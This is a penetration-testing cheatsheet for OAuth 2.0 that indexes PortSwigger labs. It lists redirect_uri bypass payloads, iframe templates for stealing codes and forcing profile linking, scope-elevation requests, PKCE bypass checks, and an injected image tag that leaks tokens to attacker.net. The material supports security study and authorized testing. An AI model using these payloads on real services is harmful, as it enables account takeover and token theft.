# OAuth 2.0 Attack Techniques — Cheatsheet

Quick-reference companion to Files 1–6. Use this during active testing; use the numbered files when you need to understand *why* something works before applying it.

---

## 1. Flow Identification Quick Reference

| response_type / grant_type | Flow | Token location | Notes |
|---|---|---|---|
| `response_type=code` | Authorization Code | Server-to-server exchange (not browser-exposed) | Most common in modern web apps; add PKCE check |
| `response_type=token` | Implicit | URL fragment (`#access_token=...`) | Deprecated in OAuth 2.1; check client-side trust handling |
| `grant_type=client_credentials` | Client Credentials | Direct response to service | No user involved; hunt for leaked client_secret |
| `grant_type=urn:ietf:params:oauth:grant-type:device_code` | Device Flow | Polling response | Watch for user_code phishing |

**Discovery endpoints to always hit first:**
```
GET /.well-known/oauth-authorization-server
GET /.well-known/openid-configuration
```

---

## 2. redirect_uri Attack Checklist (File 2)

Run through each of these against every OAuth client_id you find:

- [ ] Fully external domain: `redirect_uri=https://attacker.net`
- [ ] Prefix bypass: `redirect_uri=https://client-app.com.attacker.net`
- [ ] Suffix bypass: `redirect_uri=https://attacker.net?client-app.com`
- [ ] Subdirectory permissiveness: `redirect_uri=https://client-app.com/any/other/path`
- [ ] Path traversal against callback: `redirect_uri=https://client-app.com/callback/../../other-endpoint`
- [ ] localhost special-casing: `redirect_uri=https://localhost.attacker.net`
- [ ] Duplicate parameter pollution: `&redirect_uri=https://client-app.com/callback&redirect_uri=https://attacker.net`
- [ ] Missing scheme enforcement: `redirect_uri=http://` when `https://` is registered (downgrade)
- [ ] Open redirect chaining: find `?path=`/`?next=`/`?redirect=`-style params on any page reachable via the whitelist
- [ ] Subdomain takeover: check every subdomain of the client's registered domain for dangling DNS (CNAME to unclaimed cloud resource)

**Delivery payload template:**
```html
<iframe src="https://oauth-authorization-server.com/auth?client_id=CID&redirect_uri=TARGET&response_type=code&scope=openid%20profile%20email"></iframe>
```

**Replay a stolen code (no client_secret needed):**
```
https://client-app.com/oauth-callback?code=STOLEN_CODE
```

---

## 3. state / CSRF Attack Checklist (File 3)

- [ ] Is `state` present at all in the authorization request?
- [ ] Remove `state` from the callback entirely — does the flow still complete?
- [ ] Submit an arbitrary `state` value at callback — does it still complete?
- [ ] Is `state` structurally predictable (sequential, timestamp, hash of public data)?
- [ ] Generate a valid state+code pair from your own account/session, then replay it from a different session — does it validate?
- [ ] Test the account-linking endpoint separately from the login endpoint — CSRF protection is often applied to one but not the other

**Forced linking payload template:**
```html
<iframe src="https://client-app.com/oauth-linking?code=ATTACKER_OWN_VALID_CODE"></iframe>
```
Precondition: intercept and hold your own valid, unused code before it expires; deliver quickly.

---

## 4. Scope Elevation Checklist (File 4, Part 1)

- [ ] Request narrow scope at authorization; attempt to add scope at token exchange (Authorization Code flow):
```
grant_type=authorization_code&code=CODE&scope=openid%20email%20profile%20admin
```
- [ ] With a stolen/held token (Implicit flow), attempt an expanded scope directly against the resource server:
```
GET /userinfo?access_token=TOKEN&scope=openid%20profile%20admin
```
- [ ] Confirm whether returned token's actual scope reflects the original consent or the manipulated request
- [ ] Always pair with a concrete demonstration of what the elevated scope unlocks (severity depends on this)

---

## 5. Token/Code Leakage Checklist (File 4, Part 2)

- [ ] Query string vs. fragment — check which one carries the sensitive value (fragment = not sent via Referer; query string = is)
- [ ] Does the callback page load any third-party resource (ad, analytics pixel, font, widget) while the code/token is still in the URL?
- [ ] Does the callback page immediately strip the code from the URL (`history.replaceState`, fast redirect) before other content loads?
- [ ] If you control an HTML injection point on a whitelisted redirect_uri page: `<img src="https://attacker.net/leak">` to trigger Referer exfiltration
- [ ] Does client-side JS ever convert a fragment token into a query-string value on a subsequent request? (breaks fragment protection)
- [ ] Check accessible server logs / APM / analytics tooling for codes or tokens captured in full request URLs (authorized engagements only)

---

## 6. PKCE Bypass Checklist (File 5)

- [ ] Is `code_challenge` / `code_challenge_method` present in the authorization request at all?
- [ ] If absent on a public client (SPA/mobile/CLI) → no PKCE protection, File 2 chains apply fully
- [ ] If absent on a confidential client → check if that's treated as acceptable by the server (Misconfig 3)
- [ ] Is `code_challenge_method=plain`? → verifier is transmitted in the clear at authorization time, defeats the purpose
- [ ] Submit a deliberately wrong `code_verifier` at token exchange — does it still succeed? (Misconfig 1: not actually enforced)
- [ ] Attempt to force a method downgrade: request with `code_challenge_method=plain` even if client normally uses S256
- [ ] Combine with a File 2 stolen code: attempt redemption with your own arbitrary verifier — success means PKCE isn't stopping the interception chain

---

## 7. Full Chain Quick Map (File 6)

| Entry weakness | Escalates via | Final impact |
|---|---|---|
| Loose redirect_uri whitelist | Direct code theft + replay | Full account takeover (Chain A) |
| Loose redirect_uri + open redirect/HTML injection on whitelisted page | Token theft via chained redirect | Direct resource-server access, often undetected by client app (Chain B) |
| Missing/unbound state on linking endpoint | Forced profile linking | Persistent backdoor login (Chain C) |
| Shared login/linking callback logic | Endpoint confusion (cookie-presence assumptions) | Login endpoint behaves as linking endpoint or vice versa (Chain D) |

---

## 8. PortSwigger OAuth Authentication Lab Index (Difficulty Order)

| Difficulty | Lab | Primary file reference |
|---|---|---|
| Apprentice | Authentication bypass via OAuth implicit flow | File 1 §3 |
| Practitioner | Forced OAuth profile linking | File 3 §2, File 6 Chain C |
| Practitioner | OAuth account hijacking via redirect_uri | File 2 §1, File 6 Chain A |
| Practitioner | SSRF via OpenID dynamic client registration | Adjacent/OIDC — out of core series scope |
| Expert | Stealing OAuth access tokens via an open redirect | File 2 §2.4, File 6 Chain B |
| Expert | Stealing OAuth access tokens via a proxy page | File 2 §2.5, File 4 §2.1, File 6 Chain B |

**No dedicated PortSwigger lab currently identified for:** raw redirect_uri prefix-bypass testing in isolation (covered as topic content, exercised inside the Expert labs above), scope elevation (File 4 Part 1 — topic content only), PKCE bypass (File 5 — topic content only), login CSRF in isolation (File 3 §3), subdomain takeover chaining (File 2 §3), and endpoint-confusion chains (File 6 Chain D). These are documented because they're real-world testing techniques, not because a lab exists — verify the current lab list at `portswigger.net/web-security/all-labs` since PortSwigger updates this topic periodically.

---

## 9. General Testing Workflow for a New Target

1. Proxy a full legitimate OAuth login through Burp; save the complete flow to a project for reference.
2. Hit `.well-known` discovery endpoints on the authorization server host.
3. Identify every distinct OAuth-related client-side endpoint (login, linking, re-auth, account recovery).
4. Run the redirect_uri checklist (Section 2) against each identified `client_id`.
5. Run the state checklist (Section 3) against each endpoint independently.
6. Test PKCE enforcement (Section 6) if `code_challenge` is present.
7. Test scope handling (Section 4) if self-service client registration is available.
8. Audit any domain that passes redirect_uri validation for secondary leak points (Section 5).
9. Chain findings per File 6 before writing up — report the deepest achievable impact, not just the first weakness found.

---

## Related Files in This Series

- `01-oauth-fundamentals-and-flows.md` — mechanism-first grounding, read first
- `02-redirect-uri-attacks.md`
- `03-state-parameter-csrf-attacks.md`
- `04-scope-and-token-leakage-attacks.md`
- `05-pkce-bypass.md`
- `06-account-takeover-oauth-chains.md`
- `README.md` — series index
